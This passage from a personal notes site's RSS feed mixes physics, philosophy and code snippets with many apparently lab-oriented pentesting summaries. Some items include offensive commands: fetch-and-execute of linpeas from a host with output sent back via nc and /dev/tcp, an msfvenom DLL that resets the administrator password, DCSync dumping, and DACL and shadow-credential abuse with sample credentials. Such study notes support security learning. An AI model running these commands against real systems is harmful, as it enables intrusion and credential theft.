      <description>The inverse-square potential in quantum mechanics Intro The inverse-square potential in quantum mechanics is connected to phenomena like electron capture by neutral polar molecules, the Efimov effect in a system of three identical bosons, the transition between asymptotically-free and conformal phases in QCD-like theories as a function of the ratio of the number of quark flavors to colors, and the AdS/CFT correspondence. The attractive \[ 1/x^2 \] potential is interesting because it naturally calls upon the framework of the Renormalization Group.</description>
    </item>
    <item>
      <title>IP Time to Live (TTL)</title>
      <link>https://kdbed.github.io/posts/ip_time_to_live_ttl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/ip_time_to_live_ttl/</guid>
      <description>packetpushers</description>
    </item>
    <item>
      <title>Junkification of American Life</title>
      <link>https://kdbed.github.io/posts/junkification_of_american_life/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/junkification_of_american_life/</guid>
      <description>The Junkification of American Life Post-entertainment society creative people want to create art (work that puts demands on people), but all the commercial pressures push them to create entertainment (which gives audiences what they want). As a result, for the past many years, entertainment (superhero movies) has been swallowing up art (literary novels and serious dramas). But now, Gioia observed, even the entertainment business is in crisis. Hollywood studios are laying off employees.</description>
    </item>
    <item>
      <title>Kali Linux - Basics</title>
      <link>https://kdbed.github.io/posts/kali_basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kali_basics/</guid>
      <description>:ID: cb51a9d3-842b-4b10-ae56-2d18573b5f3e&#xA;:END:&#xA;Filesystem FHS - Filesystem Hierarchy Standard - conventions used for layout of a UNIX system LinuxFoundation&#xA;/bin : basic programs like ls, cd, cat /sbin : system programs like fdisk, makefs, sysctl /etc : configuration files bk /tmp : temporary files, typically deleted on boot /usr/bin : applications like apt, ncat, nmap /usr/share : application support and data files Basic Linux commands Finding files which searches through directories in the $PATH environment variable for a given file name; returns the full path to the file if a match is found</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://kdbed.github.io/posts/kerberoasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerberoasting/</guid>
      <description>Kerberoasting Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.&#xA;When a privileged domain account is configured to run a service in the environment, such as MS SQL, a Service Principal Name (SPN) is assigned in the domain to associate the service with that interactive service account. However, it’s important to remember that many service accounts historically have too many administrative rights.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://kdbed.github.io/posts/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerberos/</guid>
      <description>Kerberos Protocol Kerberos Authentication Attacking Kerberos Overview The main ticket you will receive is a ticket-granting ticket (TGT). These can come in various forms, such as a .kirbi for Rubeus and .ccache for Impacket. A ticket is typically base64 encoded and can be used for multiple attacks.&#xA;The ticket-granting ticket is only used to get service tickets from the KDC. When requesting a TGT from the KDC, the user will authenticate with their credentials to the KDC and request a ticket.</description>
    </item>
    <item>
      <title>Kerberos Authentication</title>
      <link>https://kdbed.github.io/posts/kerberos_authentication/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerberos_authentication/</guid>
      <description>Kerberos Authentication Kerberos is the default authentication service for Windows domains. It&amp;rsquo;s intended to be more secure than NTLM, using third party ticket authorization and stronger encryption. Kerberos still has a handful of underlying vulnerabilities that can be used in a penetration test.&#xA;Terms Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain. Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets; consists of the Authentication Service and the Ticket Granting Service.</description>
    </item>
    <item>
      <title>Kerbrute</title>
      <link>https://kdbed.github.io/posts/kerbrute_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/kerbrute_enumeration/</guid>
      <description>Kerbrute Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication. based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We&amp;rsquo;ll need to provide a username and password to do this. If the credentials are valid, we&amp;rsquo;ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.</description>
    </item>
    <item>
      <title>Lang - Test</title>
      <link>https://kdbed.github.io/posts/lang_test/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/lang_test/</guid>
      <description>Language tests in org Rust extern crate primal; use primal::Sieve; fn num_divisors(n: usize, primes: &amp;amp;Sieve) -&amp;gt; Option&amp;lt;usize&amp;gt; { match primes.factor(n) { Ok(factors) =&amp;gt; Some(factors.into_iter().fold(1, |acc, (_, x)| acc * (x + 1))), Err(_) =&amp;gt; None, } } fn main() { println!(&amp;#34;24 days of Rust - primal (day 2)&amp;#34;); let sieve = Sieve::new(10000); let suspect = 5273; println!(&amp;#34;{} is prime: {}&amp;#34;, suspect, sieve.is_prime(suspect)); let not_a_prime = 1024; println!(&amp;#34;{} is prime: {}&amp;#34;, not_a_prime, sieve.</description>
    </item>
    <item>
      <title>Lang - Test</title>
      <link>https://kdbed.github.io/posts/rust_test/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/rust_test/</guid>
      <description> extern crate regex; use regex::Regex; fn main() { let re = Regex::new(r&amp;#34;^\d{4}-\d{2}-\d{2}$&amp;#34;).unwrap(); println!(&amp;#34;test&amp;#34;); assert!(re.is_match(&amp;#34;2014-01-01&amp;#34;)); } 1 2 3 4 5 #include &amp;lt;iostream&amp;gt; int main(){ std::cout&amp;lt;&amp;lt;&amp;#34;Hello, World.\n&amp;#34;; return 0; } Hello, World. </description>
    </item>
    <item>
      <title>Lateral Movement</title>
      <link>https://kdbed.github.io/posts/lateral_movement/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/lateral_movement/</guid>
      <description>Lateral Movement The adversary is trying to move through your environment.&#xA;Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.</description>
    </item>
    <item>
      <title>linpeas</title>
      <link>https://kdbed.github.io/posts/linpeas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/linpeas/</guid>
      <description>See carlospolop : PEASS-ng hacktricks&#xA;Execution: Run from memory and send back to attacker:&#xA;# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.</description>
    </item>
    <item>
      <title>Malware</title>
      <link>https://kdbed.github.io/posts/malware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/malware/</guid>
      <description>Information Security</description>
    </item>
    <item>
      <title>Marx</title>
      <link>https://kdbed.github.io/posts/marx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/marx/</guid>
      <description></description>
    </item>
    <item>
      <title>Master Boot Record (MBR)</title>
      <link>https://kdbed.github.io/posts/master_boot_record_mbr/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/master_boot_record_mbr/</guid>
      <description></description>
    </item>
    <item>
      <title>Maxwell&#39;s Equations</title>
      <link>https://kdbed.github.io/posts/maxwell_s_equations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/maxwell_s_equations/</guid>
      <description>Electrodynamics</description>
    </item>
    <item>
      <title>Mimikatz</title>
      <link>https://kdbed.github.io/posts/mimikatz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/mimikatz/</guid>
      <description>**</description>
    </item>
    <item>
      <title>NetBIOS</title>
      <link>https://kdbed.github.io/posts/netbios/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/netbios/</guid>
      <description></description>
    </item>
    <item>
      <title>Network Traffic per Process</title>
      <link>https://kdbed.github.io/posts/network_traffic_per_process/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/network_traffic_per_process/</guid>
      <description>Examine network traffic based on PID Use netsh trace:&#xA;1 2 3 netsh trace start capture=yes traceFile=c:\tracefolder\traceName.etl ... netsh trace stop Then open the .etl file with NetMon</description>
    </item>
    <item>
      <title>Neural Networks</title>
      <link>https://kdbed.github.io/posts/neural_networks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/neural_networks/</guid>
      <description>Neural Networks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;math.h&amp;gt; // Simple nn that can learn XOR double sigmoid(double x) {return 1 / (1 + exp(-x)); } double dSigmoid(double x) {return x * (1-x); } double init_weights(){return ((double)rand()) / ((double)RAND_MAX); } void shuffle(int *array, size_t n){ if (n &amp;gt; 1){ size_t i; for (i = 0; i &amp;lt; n -1; i++){ size_t j = i + rand() / (RAND_MAX / (n - i) + 1); int t = array[j]; array[j] = array[i]; array[i] = t; } } } #define numInputs 2 #define numHiddenNodes 2 #define numOutputs 1 #define numTrainingSets 4 int main(void){ const double lr = 0.</description>
    </item>
    <item>
      <title>ngrok</title>
      <link>https://kdbed.github.io/posts/ngrok/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/ngrok/</guid>
      <description>ngrok Ngrok is used to create secure tunnels from the public internet to your local development environment&#xA;ngrok</description>
    </item>
    <item>
      <title>Nietzsche</title>
      <link>https://kdbed.github.io/posts/nietzsche/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/nietzsche/</guid>
      <description></description>
    </item>
    <item>
      <title>Nietzsche and Stoicism</title>
      <link>https://kdbed.github.io/posts/nietzsche_and_stoicism/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/nietzsche_and_stoicism/</guid>
      <description>Nietzsche and Stoicism Resolution of contradictions After describing the Stoics’ essential psychological characteristics, Nietzsche advances two obscure but critical remarks. First, he questions whether the Stoics’ attainment of their ethical ideal is significant on the grounds that the decision to adopt Stoic therapy is determined in advance by one’s character. Second, he rebukes the Stoics for underestimating the worth of pain and passion, and for the fatalistic acceptance of life that their therapy produces.</description>
    </item>
    <item>
      <title>NTLM Authentication</title>
      <link>https://kdbed.github.io/posts/ntlm_authentication/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/ntlm_authentication/</guid>
      <description>NTLM Authentication Process I enter my username and password on my local computer. My computer runs the password I typed through the standard hashing algorithm used by both client machines like mine and the domain controllers (DCs) that provide authentication and authorization services. That gives it my password hash, which it will use in Step 5. My machine sends the nearest DC a logon request, which includes my username. The DC sends back a random number, which is known as a logon challenge.</description>
    </item>
    <item>
      <title>NX</title>
      <link>https://kdbed.github.io/posts/nx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/nx/</guid>
      <description>Binary Analysis</description>
    </item>
    <item>
      <title>One-way functions</title>
      <link>https://kdbed.github.io/posts/one_way_functions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/one_way_functions/</guid>
      <description>One-way functions X X^3 [X^3 mod 15] 0 0 0 1 1 1 2 8 8 3 27 12 4 64 4 5 125 5 6 216 6 7 343 13 8 512 2 9 729 9 10 1000 10 11 1331 11 12 1728 3 13 2197 7 14 2744 14 </description>
    </item>
    <item>
      <title>Optics</title>
      <link>https://kdbed.github.io/posts/optics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/optics/</guid>
      <description>Physics</description>
    </item>
    <item>
      <title>Org Mode - Python/Jupyter Example</title>
      <link>https://kdbed.github.io/posts/orgpythonjupyter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/orgpythonjupyter/</guid>
      <description>Create a Session Initialize server with org-babel-exp-src-block. Afterwards, &amp;lsquo;Enter&amp;rsquo; in the sourceblock will execute.&#xA;print(&amp;#39;hello, world&amp;#39;) a = 10 Create a plot import matplotlib, numpy matplotlib.use(&amp;#39;Agg&amp;#39;) import matplotlib.pyplot as plt fig=plt.figure(figsize=(4,2)) x=numpy.linspace(-15,15) plt.plot(numpy.sin(x)/x) fig.tight_layout() plt.savefig(&amp;#39;python-matplot-fig.png&amp;#39;) return &amp;#39;python-matplot-fig.png&amp;#39; # return filename to org-mode Ocaml print_string &amp;#34;Hello world!\n&amp;#34; </description>
    </item>
    <item>
      <title>Originalism</title>
      <link>https://kdbed.github.io/posts/originalism/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/originalism/</guid>
      <description>Originalism, the theory that the Constitution should be interpreted according to the meaning or intent of the drafters, has great appeal to Americans. At one time closely associated with the conservative movement, originalism is now commonly held as an important, if not the exclusive, device for interpreting the Constitution. This has not been our historic practice. Over thirty years ago, Munzer and Nickel (1977, 1029) wrote that “one does not have to dig very deeply into the literature of American constitutional law to suspect that many constitutional provisions do not mean today what their framers thought they meant.</description>
    </item>
    <item>
      <title>OS Identification - Ping</title>
      <link>https://kdbed.github.io/posts/os_identification_ping/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/os_identification_ping/</guid>
      <description>IP Time to Live (TTL) on the ICMP packets The default TTL on windows is 128, which gets decremented by one at the router between the host and the box to 127. On the other hand the default for Linux is typically 64, so expect to see 63 for a Linux host.</description>
    </item>
    <item>
      <title>OSINT</title>
      <link>https://kdbed.github.io/posts/osint/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/osint/</guid>
      <description></description>
    </item>
    <item>
      <title>Pass the Ticket (PtT) Attack</title>
      <link>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pass_the_ticket_ptt_attack/</guid>
      <description>Pass the Ticket Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.</description>
    </item>
    <item>
      <title>Peano Axioms</title>
      <link>https://kdbed.github.io/posts/peano_axioms/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/peano_axioms/</guid>
      <description>Peano Axioms Peano Axiom 1: 1 is a natural number. Peano Axiom 2: Every natural number n has a unique successor S(n), which is also a natural number. Peano Axiom 3: 1 is not the successor of any natural number. Peano Axiom 4: If m and n are natural numbers and \(m \neq n\), then \(S(m)\neq S(n)\). </description>
    </item>
    <item>
      <title>Pentest - Active Directory</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory/</guid>
      <description>Active Directory Enumeration Legacy Windows Tools Use net.exe to gather user information&#xA;1 net user /domain A more detailed view of specific users in the output above:&#xA;1 net user &amp;lt;username&amp;gt; /domain Enumerate groups:&#xA;1 net group /domain Specifying a group:&#xA;1 net group &amp;lt;groupname&amp;gt; /domain PowerShell and .NET When RSAT tools aren&amp;rsquo;t available, we can use an Active Directory Services Interface ADSI (a set of interfaces built on COM as an LDAP provider.</description>
    </item>
    <item>
      <title>Pentest - Active Directory - BloodyAD</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_bloodyad/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_bloodyad/</guid>
      <description>BloodyAD Privilege Escalation&#xA;1 2 bloodyAD --host &amp;#34;$IP&amp;#34; -d &amp;#34;domain.htb&amp;#34; -u &amp;#34;&amp;lt;user&amp;gt;&amp;#34; -p &amp;#34;&amp;lt;password&amp;gt;&amp;#34; set owner &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; bloodyAD --host &amp;#34;$IP&amp;#34; -d &amp;#34;domain.htb&amp;#34; -u &amp;#34;&amp;lt;user&amp;gt;&amp;#34; -p &amp;#34;&amp;lt;password&amp;gt;&amp;#34; add groupMember &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; CravateRouge</description>
    </item>
    <item>
      <title>Pentest - Active Directory - Certificate Services</title>
      <link>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/active_directory_certificate_services_pentest/</guid>
      <description>Active Directory Certificate Services social.technet.microsoft.com&#xA;Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton&#xA;Abusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify&#xA;PS C:\ &amp;gt; .</description>
    </item>
    <item>
      <title>Pentest - Active Directory - DACL</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dacl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dacl/</guid>
      <description>Modifying DACLs Use Impacket:&#xA;1 python3 dacledit.py -action &amp;#39;write&amp;#39; -rights &amp;#39;WriteMembers&amp;#39; -principal &amp;#39;judith.mader&amp;#39; -target-dn &amp;#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&amp;#39; &amp;#39;certified.htb&amp;#39;/&amp;#39;judith.mader&amp;#39;:&amp;#39;judith09&amp;#39; (or impacket-dacledit).</description>
    </item>
    <item>
      <title>Pentest - Active Directory - DCSync</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</guid>
      <description>DCSync In BloodHound&#xA;GetChanges GetChangesAll 1 impacket-secretsdump &amp;#34;&amp;lt;domain&amp;gt;/user:password&amp;#34;@&amp;#34;dc.domain.com&amp;#34; hacktricks - DCSync</description>
    </item>
    <item>
      <title>Pentest - Active Directory - DNS</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dns/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dns/</guid>
      <description>DNS DNSAdmins Being a member of the DnsAdmins group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. Let&amp;rsquo;s create a DLL using msfvenom that changes the administrator password.&#xA;1 msfvenom -p windows/x64/exec cmd=&amp;#39;net user administrator P@s5w0rd123! /domain&amp;#39; -f dll &amp;gt; da.dll Microsoft Windows [Version 10.0.26100.6584] (c) Microsoft Corporation. All rights reserved. c:\Users\kdbed\kdbed.github.io\org&amp;gt;msfvenom -p windows/x64/exec cmd=&amp;#39;net user administrator P@s5w0rd123! /domain&amp;#39; -f dll &amp;gt; da.</description>
    </item>
    <item>
      <title>Pentest - Active Directory - DPAPI Backup Key Theft</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_dpapi_backup_key_theft/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_dpapi_backup_key_theft/</guid>
      <description>DPAPI Backup Key Theft dsinternals</description>
    </item>
    <item>
      <title>Pentest - Active Directory - gMSA Dump</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_gmsa_dump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_gmsa_dump/</guid>
      <description>Reads any gMSA password blobs the user can access and parses the values.&#xA;micahvandeusen</description>
    </item>
    <item>
      <title>Pentest - Active Directory - LDAP Enumeration</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_ldap_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_ldap_enumeration/</guid>
      <description>LDAP Enumeration Anonymous binds: ropnop - windapsearch&#xA;1 windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U &amp;gt; users Also enum4linux-ng</description>
    </item>
    <item>
      <title>Pentest - Active Directory - Shadow Credentials</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</guid>
      <description>Shadow Credentials pywhisker&#xA;Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:&#xA;1 python3 /opt/pywhisker/pywhisker.py -d &amp;#34;certified.htb&amp;#34; -u &amp;#34;judith.mader&amp;#34; -p &amp;#34;judith09&amp;#34; --target &amp;#34;management_svc&amp;#34; --action &amp;#34;add&amp;#34; The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:&#xA;1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass &amp;#39;25nQ6mg4JUTeQEjjNRE2&amp;#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.</description>
    </item>
    <item>
      <title>Pentest - Active Directory - SID-History Injection</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_sid_history_injection/</guid>
      <description>SentinelOne&#xA;ADSecurity&#xA;MITRE</description>
    </item>
    <item>
      <title>Pentest - Active Directory - UAC Bypass</title>
      <link>https://kdbed.github.io/posts/pentest_active_directory_uac_bypass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_directory_uac_bypass/</guid>
      <description>Bypassing Windows UAC Mocking trusted directories</description>
    </item>
    <item>
      <title>Pentest - Active Information Gathering</title>
      <link>https://kdbed.github.io/posts/pentest_active_information_gathering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_active_information_gathering/</guid>
      <description>Active Information Gathering DNS DNS - Basics DNS Enumeration - Basics DNS forward lookup brute-forcing to determine additional IPs belonging to a domain:&#xA;1 for ip in $(cat list.txt); do host $ip.domain.com; done Comprehensive lists available at SecLists. Based on IPs determined from the above, we can perform reverse lookups by scanning an associated range:&#xA;1 for ip in $(seq 200 254); do host xxx.xxx.xxx.$ip; done | grep -v &amp;#34;not found&amp;#34; dnsrecon dnsenum2 nslookup TCP/UDP Port Scanning Simple port scan with Netcat:</description>
    </item>
    <item>
      <title>Pentest - Antivirus Evasion</title>
      <link>https://kdbed.github.io/posts/pentest_antivirus_evasion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_antivirus_evasion/</guid>
      <description>Antivirus Evasion YARA Backdooring shellter</description>
    </item>
    <item>
      <title>Pentest - Azure AD</title>
      <link>https://kdbed.github.io/posts/azure_ad_backdoor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/azure_ad_backdoor/</guid>
      <description>Basic Recon Detect M365 usage: https://login.microsoftonline.com/getuserrealm.srf?login=test@acmecorp.com&amp;amp;xml=1 Tenant ID: https://login.microsoftonline.com/&amp;lt;target domain&amp;gt;/v2.0/.well-known/openid-configuration User enumeration: https://login.Microsoft.com/common/oauth2/token Detect invalid users while password spraying with: MSOLSpray Enumerate users via OneDrive: onedrive_user_enum Data in public Azure blobs:&#xA;storage-acct-name.blob.core.windows.net storage-acct-name.file.core.windows.net storage-acct-name.table.core.windows.net storage-acct-name.queue.core.windows.net Cloud_enum - Chris Moberly clound_enum Azure Smart Lockout - protection from pw spray; bypass with FireProx + MSOLSpray fireprox&#xA;Authentication Forms of auth: Password hash synchronization; pass through authentication; Active Directory Federation Services (ADFS); certificate-based auth; conditional access policies; long-term access tokens; legacy authentication portals If CAP applies to Device Platforms, it only reads user-agent string - easily spoofed Find gaps in CAP - dafthack/MFASweep User Account Enumeration chronlund</description>
    </item>
    <item>
      <title>Pentest - BloodHound</title>
      <link>https://kdbed.github.io/posts/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/bloodhound/</guid>
      <description>BloodHound Install SpecterOps - BloodHound&#xA;bloodhound-python bloodhound-python -u &amp;#39;&amp;lt;user&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;pw&amp;gt;&amp;#39; --dns-tcp -ns &amp;lt;ip&amp;gt; -d &amp;lt;domain&amp;gt; -c all root@kali:~# bloodhound-python -h usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-no-pass] [-aesKey hex key] [--auth-method {auto,ntlm,kerberos}] [-ns NAMESERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-dc HOST] [-gc HOST] [-w WORKERS] [--exclude-dcs] [--disable-pooling] [--disable-autogc] [--zip] [--computerfile COMPUTERFILE] [--cachefile CACHEFILE] Python based ingestor for BloodHound For help or reporting issues, visit https://github.</description>
    </item>
    <item>
      <title>Pentest - Domain Credential Access</title>
      <link>https://kdbed.github.io/posts/pentest_domain_credential_access/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_domain_credential_access/</guid>
      <description>Domain Credential Access Clear-text credentials in the domain Capture the hash Forced authentication Kerberos Kerberos Kerberoasting Kerberos Authentication Targeted Kerberoast AS-REP Roasting Automatic password management NTDS Secrets Impacket - Secrets Dump DCSync Pentest - Active Directory - DCSync DPAPI Pentest - Active Directory - DPAPI Backup Key Theft </description>
    </item>
    <item>
      <title>Pentest - Exploits</title>
      <link>https://kdbed.github.io/posts/pentest_exploits/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_exploits/</guid>
      <description>Publicly Available Exploits Exploit-DB packet storm GitHub Offsec SearchSploit Update exploitdb on kali:&#xA;1 sudo apt update &amp;amp;&amp;amp; sudo apt install exploitdb NMap - NSE Scripts are located by default in: /usr/share/nmap/scripts</description>
    </item>
    <item>
      <title>Pentest - Generating Wordlists</title>
      <link>https://kdbed.github.io/posts/pentest_generatingwordlists/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_generatingwordlists/</guid>
      <description>Generating Wordlists Username anarchy http://morningstarsecurity.com/research/username-anarchy https://github.com/urbanadventurer/username-anarchy/</description>
    </item>
    <item>
      <title>Pentest - Git</title>
      <link>https://kdbed.github.io/posts/pentest_git/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_git/</guid>
      <description>Git and Exposed Secrets Git repository on the web GitTools gitdumper : Usage - &amp;ldquo;bash gitdumper.sh http://target.tld/.git/ dest-dir [&amp;ndash;git-dir=otherdir]&amp;rdquo; extractor : in case downloaded repo is incomplete - $ ./extractor.sh /tmp/mygitrepo /tmp/mygitrepodump </description>
    </item>
    <item>
      <title>Pentest - gRPC Port 50051</title>
      <link>https://kdbed.github.io/posts/pentest_grpc_port_50051/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_grpc_port_50051/</guid>
